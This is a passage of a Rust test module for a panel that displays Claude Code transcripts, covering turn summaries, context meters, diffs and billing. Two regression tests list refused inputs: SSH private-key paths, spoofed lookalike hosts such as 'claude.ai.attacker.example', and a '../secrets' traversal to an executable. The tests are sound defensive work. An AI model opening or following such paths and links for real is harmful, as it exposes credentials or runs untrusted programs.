            restored.iter().any(|entry| entry.key.as_ref() == "u1#0"),
            "expanding a turn restores its tool entries in place"
        );
        assert!(
            restored.iter().any(|entry| matches!(
                &entry.kind,
                EntryKind::TurnSummary { turn_id, is_expanded: true, .. }
                    if turn_id.as_ref() == "u1"
            )),
            "an expanded turn keeps a header so it can be collapsed again"
        );

        let keys = live_cache_keys(&collapsed);
        assert!(
            keys.contains(&SharedString::from("u1#summary")),
            "turn-summary keys survive a rebuild: {keys:?}"
        );

        let no_tools = vec![
            user_turn_entry("plain", "just words"),
            assistant_turn_entry("plain-a", "a reply"),
        ];
        let unchanged = collapse_turns(
            no_tools.clone(),
            &HashSet::default(),
            false,
            false,
            &HashMap::default(),
            &HashMap::default(),
        );
        assert_eq!(unchanged.len(), no_tools.len());
        assert!(
            unchanged
                .iter()
                .all(|entry| !matches!(entry.kind, EntryKind::TurnSummary { .. })),
            "zero tool calls produce no summary line"
        );

        let with_peer = vec![
            user_turn_entry("u1", "start"),
            peer_turn_entry("peer"),
            tool_use_turn_entry(
                "peer#0",
                "Write",
                serde_json::json!({ "file_path": "/x.rs" }),
                "tp",
            ),
            user_turn_entry("u2", "next"),
        ];
        let collapsed_peer = collapse_turns(
            with_peer,
            &HashSet::default(),
            false,
            false,
            &HashMap::default(),
            &HashMap::default(),
        );
        assert!(
            collapsed_peer.iter().any(|entry| matches!(
                &entry.kind,
                EntryKind::TurnSummary { turn_id, calls: 1, .. } if turn_id.as_ref() == "u1"
            )),
            "a Peer message does not start a turn; the Write belongs to u1: {:?}",
            collapsed_peer
                .iter()
                .map(|entry| entry.key.to_string())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn now_row_picks_the_newest_tool_then_thinking_then_nothing() {
        let older = RunningTool {
            tool_use_id: "old".into(),
            name: "Read".into(),
            input: serde_json::json!({ "file_path": "/old.rs" }),
            started_at_ms: 1,
        };
        let newer = RunningTool {
            tool_use_id: "new".into(),
            name: "Write".into(),
            input: serde_json::json!({ "file_path": "/new.rs" }),
            started_at_ms: 2,
        };
        let mut live = LiveState::default();
        live.last_event_at_ms = 10;
        live.running_tools = vec![older, newer];
        live.turn = Turn::Running { since_ms: 1 };
        match now_row(&live, &Activity::Idle) {
            Some(NowRow::Tool {
                tool_use_id, name, ..
            }) => {
                assert_eq!(tool_use_id, "new");
                assert_eq!(name.as_ref(), "Write");
            }
            other => panic!("expected the newest running tool, got {other:?}"),
        }

        live.running_tools.clear();
        match now_row(&live, &Activity::Idle) {
            Some(NowRow::Thinking { since_ms }) => assert_eq!(since_ms, Some(1)),
            other => panic!("expected the thinking note, got {other:?}"),
        }

        live.turn = Turn::Idle;
        assert_eq!(now_row(&live, &Activity::Idle), None);

        live.last_event_at_ms = 0;
        let fallback = Activity::RunningTool {
            name: SharedString::from("Bash"),
            target: SharedString::from("ls"),
        };
        match now_row(&live, &fallback) {
            Some(NowRow::Tool { name, target, .. }) => {
                assert_eq!(name.as_ref(), "Bash");
                assert_eq!(target.as_ref(), "ls");
            }
            other => panic!("expected the transcript activity fallback, got {other:?}"),
        }
    }

    #[test]
    fn context_meter_uses_status_percentage_and_color_bands() {
        let spend = Spend {
            context_tokens: 108_000,
            ..Default::default()
        };
        let mut status = test_status_snapshot();
        status.context_used_percentage = Some(54.);
        status.context_window_size = Some(200_000);
        let meter = context_meter(Some(&status), &spend, false).expect("meter");
        assert_eq!(meter.fill, Some(0.54));
        assert!(meter.label.as_ref().contains('%'), "{}", meter.label);
        assert_eq!(context_meter_color(59.), Color::Muted);
        assert_eq!(context_meter_color(60.), Color::Warning);
        assert_eq!(context_meter_color(85.), Color::Warning);
        assert_eq!(context_meter_color(86.), Color::Error);

        let unknown_window = Spend {
            context_tokens: 108_000,
            ..Default::default()
        };
        let meter = context_meter(None, &unknown_window, false).expect("number only");
        assert_eq!(meter.fill, None);
        assert!(
            meter.label.as_ref().contains("ctx"),
            "window unknown is a number only: {}",
            meter.label
        );

        let compacted = Spend {
            context_tokens: 14_000,
            context_is_post_compaction: true,
            ..Default::default()
        };
        let meter = context_meter(None, &compacted, true).expect("compacted");
        let tooltip = meter.tooltip.expect("tooltip");
        assert!(tooltip.contains("(compacted)"));
        assert!(tooltip.contains("compacting…"));
    }

    #[test]
    fn saying_visibility_and_height_and_markdown_key() {
        let mut live = LiveState::default();
        assert!(!live_message_is_visible(&live, 1_000));

        live.live_message = Some(LiveMessage {
            turn_id: None,
            message_id: Some("m1".into()),
            text: "hello".into(),
            is_final: false,
            updated_at_ms: 1_000,
        });
        live.turn = Turn::Idle;
        assert!(live_message_is_visible(&live, 1_000));
        assert!(!live_message_is_visible(
            &live,
            1_000 + LIVE_MESSAGE_STALE_MS + 1
        ));
        live.turn = Turn::Running { since_ms: 1 };
        assert!(live_message_is_visible(
            &live,
            1_000 + LIVE_MESSAGE_STALE_MS + 1
        ));

        assert_eq!(live_message_markdown_key(Some("m1")).as_ref(), "live:m1");
        assert_ne!(
            live_message_markdown_key(Some("m1")),
            live_message_markdown_key(Some("m2"))
        );

        let rem = px(16.);
        let panel = px(400.);
        assert_eq!(
            clamp_live_message_height(px(10.), rem, panel),
            rem * LIVE_MESSAGE_MIN_HEIGHT_REMS
        );
        let requested = panel * 0.9;
        assert_eq!(
            clamp_live_message_height(requested, rem, panel),
            panel * LIVE_MESSAGE_HEIGHT_PANEL_FRACTION
        );
    }

    #[test]
    fn a_second_interrupt_within_five_seconds_is_suppressed() {
        assert!(
            interrupt_is_awaiting_result(Some(1_000), 1_001),
            "a click 1ms after Stop must not queue a second outbox file"
        );
        assert!(
            !interrupt_is_awaiting_result(None, 1_000),
            "the first Stop must still send; expected awaiting=false with no prior send"
        );
        assert!(
            !interrupt_is_awaiting_result(Some(1_000), 1_000 + INTERRUPT_SENT_MS),
            "after 5s a still-running turn may send again; that retry must not be refused"
        );
    }

    #[test]
    fn format_elapsed_mm_ss_clamps_negative_and_caps_display() {
        assert_eq!(
            format_elapsed_mm_ss(-50),
            "0:00",
            "a host clock ahead of local now must not show negative elapsed"
        );
        assert_eq!(format_elapsed_mm_ss(90_000), "1:30");
        assert_eq!(
            format_elapsed_mm_ss(100_000_000_000),
            "99:59",
            "a skewed remote clock must not render millions of minutes, got {}",
            format_elapsed_mm_ss(100_000_000_000)
        );
    }

    #[test]
    fn context_meter_clamps_percentage_to_zero_through_one_hundred() {
        let spend = Spend {
            context_tokens: 108_000,
            ..Default::default()
        };
        let mut over = test_status_snapshot();
        over.context_used_percentage = Some(150.);
        over.context_window_size = Some(200_000);
        let meter = context_meter(Some(&over), &spend, false).expect("over");
        assert!(
            meter.fill.is_some_and(|fill| (0. ..=1.).contains(&fill)),
            "150% must clamp fill to 0..=1, got {:?}",
            meter.fill
        );
        assert!(
            !meter.label.as_ref().contains("150"),
            "150% must not appear unclamped in the label, got {}",
            meter.label
        );

        let mut under = test_status_snapshot();
        under.context_used_percentage = Some(-5.);
        under.context_window_size = Some(200_000);
        let meter = context_meter(Some(&under), &spend, false).expect("under");
        assert!(
            meter.fill.is_some_and(|fill| (0. ..=1.).contains(&fill)),
            "a negative percentage must clamp fill to 0..=1, got {:?}",
            meter.fill
        );
    }

    #[test]
    fn format_resets_at_ignores_non_positive_unix_times() {
        assert_eq!(
            format_resets_at(-1),
            None,
            "a negative resets_at must not render as a local date"
        );
        assert_eq!(
            format_resets_at(0),
            None,
            "a zero resets_at must not render as a local date"
        );
        let later =
            format_resets_at(1_700_000_000).expect("a real unix timestamp must still format");
        assert!(
            later.contains('-'),
            "a real unix timestamp must still format as local time, got {later}"
        );
    }

    #[test]
    fn rate_limit_fact_formats_both_windows() {
        assert_eq!(
            rate_limit_fact(Some(23.), Some(41.)).as_deref(),
            Some("5h 23% · 7d 41%")
        );
        assert_eq!(rate_limit_fact(Some(23.), None).as_deref(), Some("5h 23%"));
        assert_eq!(rate_limit_fact(None, Some(41.)).as_deref(), Some("7d 41%"));
        assert_eq!(rate_limit_fact(None, None), None);
    }

    #[test]
    fn structured_patch_text_separates_hunks_with_headers() {
        let text = structured_patch_text(Some(&serde_json::json!({
            "structuredPatch": [
                { "oldStart": 1, "newStart": 1, "lines": ["-a", "+b"] },
                { "oldStart": 40, "newStart": 41, "lines": ["-c", "+d"] }
            ]
        })))
        .expect("hunks");
        assert!(text.contains("@@ -1,+1 @@"), "{text}");
        assert!(text.contains("@@ -40,+41 @@"), "{text}");
    }

    #[test]
    fn auto_mode_flags_are_named_in_the_permission_tooltip() {
        let tooltip = auto_mode_tooltip(
            Some("auto"),
            Some(AutoModeFlags {
                bash_first: true,
                steer_only: true,
                bypass: false,
            }),
        );
        assert!(tooltip.contains("auto"));
        assert!(tooltip.contains("bash-first"));
        assert!(tooltip.contains("steer-only"));
        assert!(!tooltip.contains("bypass"));
    }

    #[test]
    fn ai_title_wins_over_the_registry_name() {
        assert_eq!(
            preferred_name(Some("Later title"), Some("registry name"), "session-id"),
            "Later title"
        );
        assert_eq!(
            preferred_name(None, Some("registry name"), "session-id"),
            "registry name"
        );
    }

    #[test]
    fn tool_target_prefers_file_path() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Read",
                serde_json::json!({ "file_path": "/a/b/c.rs", "path": "ignored" }),
            ))
            .as_ref(),
            "/a/b/c.rs"
        );
    }

    #[test]
    fn tool_target_falls_back_to_path() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Glob",
                serde_json::json!({ "path": "/src" })
            ))
            .as_ref(),
            "/src"
        );
    }

    #[test]
    fn tool_target_falls_back_to_pattern() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Glob",
                serde_json::json!({ "pattern": "**/*.rs" })
            ))
            .as_ref(),
            "**/*.rs"
        );
    }

    #[test]
    fn tool_target_falls_back_to_url() {
        assert_eq!(
            tool_target(&tool_use_block(
                "WebFetch",
                serde_json::json!({ "url": "https://example.com" }),
            ))
            .as_ref(),
            "https://example.com"
        );
    }

    #[test]
    fn tool_target_falls_back_to_query() {
        assert_eq!(
            tool_target(&tool_use_block(
                "WebSearch",
                serde_json::json!({ "query": "zed editor" })
            ))
            .as_ref(),
            "zed editor"
        );
    }

    #[test]
    fn tool_target_falls_back_to_command() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Bash",
                serde_json::json!({ "command": "ls -la" })
            ))
            .as_ref(),
            "ls -la"
        );
    }

    #[test]
    fn tool_target_falls_back_to_description() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Agent",
                serde_json::json!({ "description": "explore the crate" }),
            ))
            .as_ref(),
            "explore the crate"
        );
    }

    #[test]
    fn tool_target_falls_back_to_skill() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Skill",
                serde_json::json!({ "skill": "codegraph" })
            ))
            .as_ref(),
            "codegraph"
        );
    }

    #[test]
    fn tool_target_falls_back_to_prompt_first_line() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Agent",
                serde_json::json!({ "prompt": "first line\nsecond line" }),
            ))
            .as_ref(),
            "first line"
        );
    }

    #[test]
    fn tool_target_falls_back_to_the_first_string_field() {
        assert_eq!(
            tool_target(&tool_use_block(
                "Mystery",
                serde_json::json!({ "count": 3, "label": "named" }),
            ))
            .as_ref(),
            "named"
        );
    }

    #[test]
    fn mcp_names_split_into_server_and_tool() {
        assert_eq!(
            mcp_tool_parts("mcp__github__list_issues"),
            Some(("github", "list_issues"))
        );
        assert_eq!(mcp_tool_parts("Bash"), None);
    }

    #[test]
    fn an_edit_diff_marks_a_one_line_change() {
        let diff = edit_diff_text("old\n", "new\n");
        assert!(diff.contains("-old"), "got {diff:?}");
        assert!(diff.contains("+new"), "got {diff:?}");
    }

    #[test]
    fn an_edit_diff_handles_an_empty_old_string() {
        let diff = edit_diff_text("", "new\n");
        assert!(diff.contains("+new"), "got {diff:?}");
        assert!(!diff.contains("-new"), "got {diff:?}");
    }

    #[test]
    fn todowrite_parses_three_statuses() {
        let todos = parse_todos(&serde_json::json!({
            "todos": [
                {"content": "one", "status": "pending"},
                {"content": "two", "status": "in_progress"},
                {"content": "three", "status": "completed"}
            ]
        }))
        .expect("three well-formed todos");
        assert_eq!(todos.len(), 3);
        assert!(matches!(todos[0].status, TodoStatus::Pending));
        assert!(matches!(todos[1].status, TodoStatus::InProgress));
        assert!(matches!(todos[2].status, TodoStatus::Completed));
    }

    #[test]
    fn ask_user_question_shows_the_question_and_options() {
        let questions = parse_asked_questions(&serde_json::json!({
            "questions": [{
                "question": "Which extras?",
                "options": [{ "label": "CodeGraph" }, { "label": "Tests" }]
            }]
        }))
        .expect("a well-formed question");
        assert_eq!(questions[0].question.as_ref(), "Which extras?");
        assert_eq!(questions[0].options.len(), 2);
        assert_eq!(
            pretty_ask_user_answers(r#"{"answers":[{"label":"CodeGraph"},{"label":"Tests"}]}"#)
                .as_ref(),
            "CodeGraph\nTests"
        );
    }

    #[test]
    fn malformed_questions_and_todos_degrade_without_panicking() {
        assert!(
            parse_asked_questions(&serde_json::json!({ "questions": "not an array" })).is_none()
        );
        assert!(
            parse_todos(&serde_json::json!({
                "todos": [{ "content": "missing status" }]
            }))
            .is_none()
        );
        assert!(
            structured_patch_text(Some(&serde_json::json!({
                "structuredPatch": { "not": "an array" }
            })))
            .is_none()
        );
    }

    #[test]
    fn an_image_block_in_a_tool_result_is_an_image_entry() {
        let entries = entries_of(&[
            r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"t1","name":"Read","input":{}}]}}"#,
            r#"{"type":"user","uuid":"b","message":{"content":[{"type":"tool_result","tool_use_id":"t1","content":[{"type":"text","text":"see this"},{"type":"image","source":{"type":"base64","media_type":"image/png","data":"AAAABBBB"}}]}]}}"#,
        ]);
        assert!(
            entries
                .iter()
                .any(|entry| matches!(entry.kind, EntryKind::Image { .. })),
            "an image block in a result must be drawn as an image"
        );
        assert!(entries.iter().any(|entry| matches!(
            &entry.kind,
            EntryKind::ToolResult { body: ToolResultBody::Inline(text), .. } if text.as_ref() == "see this"
        )));
    }

    #[test]
    fn sent_files_carry_is_error() {
        let line = serde_json::json!({
            "type": "user",
            "uuid": "b",
            "message": { "content": [ {
                "type": "tool_result",
                "tool_use_id": "t1",
                "is_error": true,
                "content": "delivery failed",
            } ] },
            "toolUseResult": {
                "caption": "caption",
                "attachments": [{
                    "path": "/home/coder/project/shot.png",
                    "size": 2048,
                    "isImage": true,
                    "media_type": "image/png",
                }],
            },
        })
        .to_string();
        let entries = entries_of(&[TOOL_USE_LINE, &line]);
        match entries.get(1).map(|entry| &entry.kind) {
            Some(EntryKind::SentFiles { is_error, .. }) => {
                assert!(*is_error, "the delivery's is_error must be carried");
            }
            _ => panic!("expected sent files"),
        }
    }

    #[test]
    fn an_oversized_sent_image_is_confirmable_instead_of_refused() {
        let (_, files) = sent_files_of(&send_user_file_line(
            serde_json::json!([{
                "path": "/home/coder/project/huge.png",
                "size": 8_000_000,
                "isImage": true,
                "media_type": "image/png",
            }]),
            "huge",
        ));
        let size = files[0].size.expect("the delivery recorded a size");
        assert!(size > MAX_SENT_IMAGE_BYTES);
        assert!(size <= MAX_SENT_IMAGE_BYTES_ABSOLUTE);
        assert!(sent_image_format(&files[0]).is_some());
    }

    #[test]
    fn line_changes_are_a_toolbar_fact() {
        assert_eq!(line_change_fact(156, 23).as_deref(), Some("+156 −23 lines"));
    }

    // Review round 1 regressions.

    #[test]
    fn a_bridge_status_link_is_only_offered_for_a_claude_ai_url() {
        let offered = |url: &str| {
            let line = format!(
                r#"{{"type":"system","subtype":"bridge_status","uuid":"a","content":"connected","url":"{url}"}}"#
            );
            match &entries_of(&[&line])[0].kind {
                EntryKind::SystemNote { url, .. } => url.clone(),
                _ => panic!("expected a system note for a bridge_status record"),
            }
        };

        // The link is a button that hands the string to the machine's URL opener, so a
        // transcript naming anything but the bridge must not produce one.
        for refused in [
            "file:///Users/reader/.ssh/id_ed25519",
            "http://claude.ai/code/session_01",
            "https://claude.ai.attacker.example/code/session_01",
            "https://claude.aievil.com/x",
            "not a url at all",
        ] {
            assert_eq!(
                offered(refused).as_deref(),
                None,
                "expected no link for {refused:?}, got {:?}",
                offered(refused)
            );
        }

        // The bridge's own URL is legal input and must still be offered.
        assert_eq!(
            offered("https://claude.ai/code/session_01").as_deref(),
            Some("https://claude.ai/code/session_01"),
            "the bridge's own URL must stay a link"
        );
    }

    #[test]
    fn a_sent_file_outside_the_session_is_not_opened() {
        let working_directory = Path::new("/home/coder/project");

        // A path the panel would refuse to read must not be a path it asks the OS to
        // open: opening one runs whatever is registered for it.
        for refused in [
            "/home/coder/.ssh/id_ed25519",
            "/Applications/Calculator.app",
            "/home/coder/project/../secrets/open-me.command",
            "relative/shot.png",
        ] {
            assert!(
                !sent_path_is_openable(Path::new(refused), working_directory),
                "expected {refused} to be refused, it was offered to the OS opener"
            );
        }

        // What a session really does send: a file under its own working directory, and
        // one written to a temporary directory.
        for allowed in [
            "/home/coder/project/shot.png",
            "/home/coder/project/out/report.mp4",
            "/tmp/claude-shot.png",
            "/private/tmp/claude-shot.png",
        ] {
            assert!(
                sent_path_is_openable(Path::new(allowed), working_directory),
                "expected {allowed} to stay openable, it was refused"
            );
        }
    }

    #[test]
    fn a_very_large_edit_is_not_diffed_line_by_line() {
        let old_string = "one line of the file\n".repeat(20_000);
        let new_string = "another line of the file\n".repeat(20_000);
        let input = serde_json::json!({
            "file_path": "/home/coder/project/big.rs",
            "old_string": old_string,
            "new_string": new_string,
        });

        let diff = edit_input_diff(&input).expect("an edit with both strings has a diff");
        assert!(
            diff.len() <= 200,
            "an edit this large must be summarized rather than diffed line by line; got \
             {} characters starting {:?}",
            diff.len(),
            diff.chars().take(60).collect::<String>()
        );

        // An edit of an ordinary size is legal input and must still be a real diff.
        let small = serde_json::json!({
            "old_string": "the old line\n",
            "new_string": "the new line\n",
        });
        assert_eq!(
            edit_input_diff(&small).as_deref(),
            Some("-the old line\n+the new line\n"),
            "an ordinary edit must still be diffed"
        );
    }

    #[test]
    fn the_todo_header_counts_what_is_done_and_names_what_is_running() {
        let todos = vec![
            TodoItem {
                content: "read the spec".into(),
                status: TodoStatus::Completed,
            },
            TodoItem {
                content: "write the findings".into(),
                status: TodoStatus::Completed,
            },
            TodoItem {
                content: "land the red tests".into(),
                status: TodoStatus::InProgress,
            },
            TodoItem {
                content: "fix to green".into(),
                status: TodoStatus::Pending,
            },
        ];
        assert_eq!(
            todo_summary(&todos).as_ref(),
            "Todo · 2/4 done · land the red tests",
            "a collapsed checklist has to say how far it is and what is running"
        );

        // A list with nothing running says only how far it is.
        let done = vec![TodoItem {
            content: "read the spec".into(),
            status: TodoStatus::Completed,
        }];
        assert_eq!(todo_summary(&done).as_ref(), "Todo · 1/1 done");
    }

    #[test]
    fn the_bash_first_steer_is_named_in_the_permission_tooltip() {
        let tooltip = permission_tooltip(
            Some("acceptEdits"),
            Some(AutoModeFlags {
                bash_first: true,
                steer_only: false,
                bypass: false,
            }),
            Some("strict"),
        );
        assert!(
            tooltip.contains("strict"),
            "the steer the auto_mode attachment recorded has to reach the tooltip; got \
             {tooltip:?}"
        );

        // Nothing is invented for a session that recorded no steer.
        let without = permission_tooltip(Some("acceptEdits"), Some(AutoModeFlags::default()), None);
        assert!(
            !without.contains("steer:"),
            "a session with no steer must not be given one; got {without:?}"
        );
    }

    #[test]
    fn a_peer_handback_without_origin_fields_is_not_the_reader() {
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"<task-notification>\n<task-id>t1</task-id>\n<status>completed</status>\n</task-notification>\n\nAnother Claude session sent a message:\n<agent-message from=\"Explore\">the review is done</agent-message>"}}"#,
        ]);
        let message = entries.iter().find_map(|entry| match &entry.kind {
            EntryKind::Message { role, source, .. } => Some((role.clone(), source.clone())),
            _ => None,
        });
        match message {
            Some((role, source)) => {
                assert!(
                    matches!(role, MessageRole::Peer { .. }),
                    "a hand-back from another session is not the reader's own message; got \
                     role {role:?} for {source:?}"
                );
                assert_eq!(
                    source.as_ref(),
                    "the review is done",
                    "the wrapper is not part of what was said"
                );
            }
            None => panic!(
                "the hand-back must reach the conversation as a peer message; no message \
                 entry was built at all"
            ),
        }
    }

    #[test]
    fn a_message_quoting_the_peer_wrapper_is_still_the_readers_own() {
        // The legal input the rule above could wrongly take: the reader writing about the
        // wrapper rather than a session sending one.
        let entries = entries_of(&[
            r#"{"type":"user","uuid":"a","message":{"content":"why does <agent-message from=\"Explore\"> show up in my panel?"}}"#,
        ]);
        match &entries[0].kind {
            EntryKind::Message { role, .. } => assert_eq!(
                role,
                &MessageRole::User,
                "a message that merely quotes the wrapper stays the reader's own"
            ),
            _ => panic!("expected a message"),
        }
    }

    #[test]
    fn a_dispatch_flag_is_read_from_a_flag_and_not_from_a_substring() {
        let dispatch = parse_cli_dispatch(
            "node --max-old-space-size=512 script.ts && agy --print-timeout 30m -p \"$(cat /tmp/promptA.txt)\"",
        )
        .expect("an agy command is a dispatch");
        assert_eq!(
            dispatch.model.as_deref(),
            None,
            "a command with no model flag has no model; the -m inside \
             --max-old-space-size is not one"
        );

        // The model flags that are really written must still be read.
        assert_eq!(
            parse_cli_dispatch("codex exec -m gpt-6-astra -c model_reasoning_effort=\"xhigh\"")
                .and_then(|dispatch| dispatch.model)
                .as_deref(),
            Some("gpt-6-astra")
        );
        assert_eq!(
            parse_cli_dispatch(
                "agent -f --trust -p \"$(cat /tmp/p.txt)\" --model \"cursor-grok-4.6-high\""
            )
            .and_then(|dispatch| dispatch.model)
            .as_deref(),
            Some("cursor-grok-4.6-high")
        );
    }

    #[test]
    fn a_redirect_inside_the_prompt_is_not_the_log_file() {
        let dispatch = parse_cli_dispatch(
            "agent -f --trust -p \"say whether a > b\" --model m > /tmp/run.log && echo \"x > y\"",
        )
        .expect("an agent command is a dispatch");
        assert_eq!(
            dispatch.log_path.as_deref(),
            Some(Path::new("/tmp/run.log")),
            "the log is the command's own redirect, not a > inside the prompt"
        );
    }

    #[test]
    fn a_dispatch_prompt_read_outlives_the_next_rebuild() {
        let entries = vec![Entry {
            key: SharedString::from("record-a#0"),
            kind: EntryKind::ToolUse {
                name: SharedString::from(BASH_TOOL_NAME),
                input: SharedString::from(
                    r#"{"command":"agy --model gemini-3.8-flash-high -p \"$(cat /tmp/p.txt)\""}"#,
                ),
                id: None,
                diff: None,
            },
        }];
        let keys = live_cache_keys(&entries);
        let wanted = dispatch_prompt_key(&entries[0].key);
        assert!(
            keys.contains(&wanted),
            "the read of a dispatch card's prompt is dropped by the next rebuild unless \
             its key is live; wanted {wanted}, got {:?}",
            keys.iter().map(SharedString::as_ref).collect::<Vec<_>>()
        );
    }

    #[test]
    fn a_turn_duration_written_as_a_float_is_still_a_duration() {
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"turn_duration","uuid":"a","durationMs":272000.0,"messageCount":209.0,"pendingBackgroundAgentCount":2}"#,
        ]);
        match &entries[0].kind {
            EntryKind::TurnFooter {
                duration_ms,
                message_count,
                pending_background_agents,
            } => {
                assert_eq!(
                    (*duration_ms, *message_count, *pending_background_agents),
                    (272_000, 209, 2),
                    "a float is how JSON writes a whole number too"
                );
            }
            _ => panic!("expected a turn footer"),
        }

        // A field that is missing is still nothing, not a guess.
        let entries = entries_of(&[
            r#"{"type":"system","subtype":"turn_duration","uuid":"a","durationMs":1000}"#,
        ]);
        match &entries[0].kind {
            EntryKind::TurnFooter {
                duration_ms,
                message_count,
                ..
            } => assert_eq!((*duration_ms, *message_count), (1000, 0)),
            _ => panic!("expected a turn footer"),
        }
    }

    const EDIT_CALL_LINE: &str = r#"{"type":"assistant","uuid":"a","message":{"content":[{"type":"tool_use","id":"toolu_edit","name":"Edit","input":{"file_path":"/home/coder/project/main.rs","old_string":"the old line\n","new_string":"the new line\n"}}]}}"#;
    const EDIT_RESULT_LINE: &str = r#"{"type":"user","uuid":"b","toolUseResult":{"filePath":"/home/coder/project/main.rs","structuredPatch":[{"oldStart":1,"oldLines":1,"newStart":1,"newLines":1,"lines":["-the old line","+the new line"]}]},"message":{"content":[{"type":"tool_result","tool_use_id":"toolu_edit","content":"applied"}]}}"#;

    #[test]
    fn an_edit_carries_its_diff_in_the_entry_it_is_drawn_from() {
        let records = [record(EDIT_CALL_LINE)];
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        let mut cache = EntryCache::default();

        let entries = build_entries(&path, None, &mut cache);
        match &entries[0].kind {
            EntryKind::ToolUse { diff, .. } => assert_eq!(
                diff.as_deref(),
                Some("-the old line\n+the new line\n"),
                "the diff belongs to the entry, which is derived once, and not to the \
                 frame, which is drawn many times a second"
            ),
            _ => panic!("expected a tool call"),
        }

        let derived = cache.derived;
        let again = build_entries(&path, None, &mut cache);
        assert_eq!(
            cache.derived,
            derived,
            "a rebuild must reuse the diff it already derived; it derived {} more",
            cache.derived.saturating_sub(derived)
        );
        assert!(again == entries, "a rebuild must produce the same entries");
    }

    #[test]
    fn an_edit_answered_with_a_patch_is_diffed_once() {
        let records = [record(EDIT_CALL_LINE), record(EDIT_RESULT_LINE)];
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        let patched = calls_answered_with_a_patch(&path);
        assert!(
            patched.contains(&SharedString::from("toolu_edit")),
            "the result carries a structuredPatch, so its call is answered with one; got \
             {:?}",
            patched.iter().map(SharedString::as_ref).collect::<Vec<_>>()
        );

        let diff = SharedString::from("-the old line\n+the new line\n");
        let answered = SharedString::from("toolu_edit");
        assert_eq!(
            edit_card_diff(Some(&diff), Some(&answered), &patched),
            None,
            "the patch on the result is the one diff for this call; the card must not \
             draw a second one"
        );

        // A call the transcript has no result for yet, and one whose result carries no
        // patch, still show the diff of what they were asked to change.
        let running = SharedString::from("toolu_running");
        assert_eq!(
            edit_card_diff(Some(&diff), Some(&running), &patched),
            Some(&diff),
            "a call that has not been answered keeps the diff of its own input"
        );
        assert_eq!(
            edit_card_diff(Some(&diff), None, &patched),
            Some(&diff),
            "a call whose block carried no id keeps the diff of its own input"
        );
    }

    fn usage_of(
        input_tokens: u64,
        cache_write_1h_tokens: u64,
        cache_write_5m_tokens: u64,
        cache_read_tokens: u64,
        output_tokens: u64,
        thinking_tokens: u64,
    ) -> Usage {
        Usage {
            input_tokens,
            cache_write_1h_tokens,
            cache_write_5m_tokens,
            cache_read_tokens,
            output_tokens,
            thinking_tokens,
        }
    }

    fn billed_message(key: &str, usage: Usage) -> Entry {
        Entry {
            key: SharedString::from(key),
            kind: EntryKind::Message {
                role: MessageRole::Assistant,
                source: SharedString::from("answer"),
                usage: Some(usage),
                answered_at: None,
            },
        }
    }

    /// The turn's bill when nothing outside the entries is known about it, which is how
    /// the tests that hand-build entries ask for it.
    fn turn_usage(entries: &[Entry], turn_start: usize) -> (Vec<Usage>, Usage) {
        turn_billing(entries, turn_start, &HashMap::default())
    }

    fn is_turn_cost_anchor(entries: &[Entry], index: usize) -> bool {
        turn_cost_anchor(entries, index, &HashMap::default())
    }

    /// One turn's records the way Claude Code writes them, and everything the panel
    /// derives from them.
    fn turn_of(json_lines: &[String]) -> (Vec<Entry>, HashMap<SharedString, Billed>) {
        let records: Vec<TranscriptRecord> = json_lines
            .iter()
            .map(|line| record(line.as_str()))
            .collect();
        let path: Vec<&TranscriptRecord> = records.iter().collect();
        let entries = build_entries(&path, None, &mut EntryCache::default());
        let billing = billing_of_path(&path);
        (entries, billing)
    }

    fn usage_json(input: u64, cache_read: u64, cache_write: u64, output: u64) -> Value {
        serde_json::json!({
            "input_tokens": input,
            "cache_read_input_tokens": cache_read,
            "cache_creation_input_tokens": cache_write,
            "output_tokens": output,
        })
    }

    /// One assistant record: one content block, and a copy of the whole call's usage.
    fn billed_block_line(
        uuid: &str,
        request_id: Option<&str>,
        block: Value,
        usage: &Value,
    ) -> String {
        let mut line = serde_json::json!({
            "type": "assistant",
            "uuid": uuid,
            "message": {
                "role": "assistant",
                "model": "claude-sonnet-4-5",
                "content": [block],
                "usage": usage,
            },
        });
        if let Some(request_id) = request_id
            && let Some(object) = line.as_object_mut()
        {
            object.insert(
                REQUEST_ID_FIELD.to_string(),
                Value::String(request_id.to_string()),
            );
        }
        line.to_string()
    }

    fn thinking_block() -> Value {
        serde_json::json!({"type": "thinking", "thinking": "weighing it up"})
    }

    fn text_block(text: &str) -> Value {
        serde_json::json!({"type": "text", "text": text})
    }

    fn read_call_block(id: &str) -> Value {
        serde_json::json!({"type": "tool_use", "id": id, "name": "Read", "input": {"file_path": "/tmp/a.rs"}})
    }

    /// Claude Code writes one record per content block, and only a `text` block becomes
    /// a message. An answer that thought and called a tool is billed for every token it
    /// spent and writes no message at all, so a bill read off the messages misses it.
    #[test]
    fn a_turn_bills_the_calls_that_wrote_no_text() {
        let first = usage_json(11, 2_200, 330, 44);
        let second = usage_json(7, 1_100, 220, 33);
        let (entries, billing) = turn_of(&[
            user_message_line("u1", "go"),
            billed_block_line("a1", Some("req-1"), thinking_block(), &first),
            billed_block_line("a2", Some("req-1"), read_call_block("call-1"), &first),
            billed_block_line("a3", Some("req-2"), text_block("done"), &second),
        ]);

        let expected_first = Usage::from_record(&serde_json::json!({"message": {"usage": first}}))
            .expect("the fixture carries usage");
        let expected_second =
            Usage::from_record(&serde_json::json!({"message": {"usage": second}}))
                .expect("the fixture carries usage");

        let (calls, total) = turn_billing(&entries, 0, &billing);
        assert_eq!(
            calls,
            vec![expected_first, expected_second],
            "an answer that only thought and called a tool is still a billed call"
        );
        assert_eq!(
            total.output_tokens, 77,
            "output tokens of the whole turn; got {}, expected 44 + 33",
            total.output_tokens
        );
        assert_eq!(
            total.cache_read_tokens, 3_300,
            "cache read of the whole turn; got {}, expected 2200 + 1100",
            total.cache_read_tokens
        );
    }

    /// The records of one call carry identical copies of its usage under different
    /// uuids, so the uuid cannot be what tells one call from the next.
    #[test]
